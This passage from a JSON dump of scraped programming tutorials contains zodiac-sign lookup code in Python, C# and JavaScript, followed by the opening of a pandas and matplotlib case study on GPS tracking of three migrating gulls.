month):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# checks month and date within the valid range\u00a0\u00a0\u00a0\u00a0# of a specified zodiac\u00a0\u00a0\u00a0\u00a0if month == 'december':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Sagittarius' if (day < 22) else 'capricorn'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'january':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Capricorn' if (day < 20) else 'aquarius'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'february':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Aquarius' if (day < 19) else 'pisces'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'march':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Pisces' if (day < 21) else 'aries'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'april':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Aries' if (day < 20) else 'taurus'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'may':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Taurus' if (day < 21) else 'gemini'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'june':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Gemini' if (day < 21) else 'cancer'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'july':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Cancer' if (day < 23) else 'leo'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'august':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Leo' if (day < 23) else 'virgo'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'september':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Virgo' if (day < 23) else 'libra'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'october':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Libra' if (day < 23) else 'scorpio'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'november':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'scorpio' if (day < 22) else 'sagittarius'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(astro_sign)\u00a0\u00a0\u00a0\u00a0\u00a0# Driver codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0day = 19\u00a0\u00a0\u00a0\u00a0month = \"may\"\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month)C#// C# program to display astrological sign// or Zodiac sign for given date of birthusing System;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0static void zodiac_sign(int day, string month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.WriteLine(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Driver code\u00a0\u00a0\u00a0\u00a0public static void Main ()\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}}\u00a0// This code is contributed by vt_m.Javascript<script>\u00a0// JavaScript program to display astrological sign// or Zodiac sign for given date of birth\u00a0// Function to calculate sum// digits of nfunction zodiac_sign(day, month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0// Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0</script>Output:\u00a0\u00a0Taurus\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e3f778054caf212697f3d4fbeffcfa55",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "One fascinating area of research uses GPS to track the movements of animals. It is now possible to manufacture a small GPS device that is solar charged, so you don\u2019t need to change batteries and use it to track flight patterns of birds.\u00a0The data for this case study comes from the LifeWatch INBO project. Several data sets have been released as part of this project. We will use a small data set that consists of migration data for three gulls named Eric, Nico, and Sanne. The official_datasets; used dataset \u2013 CSV\u201d>csv file contains eight columns and includes variables like latitude, longitude, altitude, and time stamps. In this case study, we will first load the data, visualize some simple flight trajectories, track flight speed, learn about daytime, and much, much more.Aim: Track the movement of three gulls namely \u2013 Eric, Nico & SanneDataset: official_datasets; used dataset \u2013 csv\u00a0Dependencies: Matplotlib, Pandas, Numpy, Cartopy, ShapelyRepository(Github): source code\u00a0(check the repository for the documentation of source code.)\u00a0Writeup: explanation(.pdf)We will divide our case study into five parts:\u00a01. Visualizing longitude and latitude data of the gulls.\u00a02. Visualize the variation of the speed of the gulls.\u00a03. Visualize the time required by the gulls to cover equal distances over the journey.\u00a04. Visualize the daily mean speed of the gulls.\u00a05. Cartographic view of the journey of the gulls.PART (1/5): Latitude and Longitude\u00a0In this part, we are going to visualize the location of the birds. We are going to plot latitude and longitude along the y and x-axis respectively and visualize the location data present in the csv file.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport numpy as np\u00a0\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# storing the indices of the bird Ericix = birddata.bird_name == \"Eric\"x,y = birddata.longitude[ix], birddata.latitude[ix]plt.figure(figsize = (7,7))plt.plot(x,y,\"b.\")\u00a0''' To look at all the birds trajectories,\u00a0\u00a0\u00a0\u00a0we plot each bird in the same plot '''plt.figure(figsize = (7,7))for bird_name in bird_names:\u00a0\u00a0\u00a0\u00a0\u00a0# storing the indices of the bird Eric\u00a0\u00a0\u00a0\u00a0ix = birddata.bird_name == bird_name\u00a0\u00a0\u00a0\u00a0\u00a0x,y = birddata.longitude[ix], birddata.latitude[ix]\u00a0\u00a0\u00a0\u00a0plt.plot(x,y,\".\", 